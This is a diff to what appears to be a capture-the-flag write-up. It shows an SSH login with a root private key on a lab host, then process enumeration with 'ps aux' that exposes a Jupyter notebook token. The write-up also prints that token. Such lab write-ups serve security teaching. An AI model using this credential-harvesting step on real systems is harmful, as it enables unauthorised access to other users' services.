@@ -193,3 +193,18 @@ ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216
 ```
 mcp-dev@devhub:~$ 
 ```
+
+Enumerating the system, we display running processes for the analyst user, which discloses a token for Jupyter notebook on port 8888:
+
+#### Reading running processes:
+
+```
+ps aux | grep analyst
+```
+
+#### Extracting sensitive token value:
+
+```
+--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+```
+
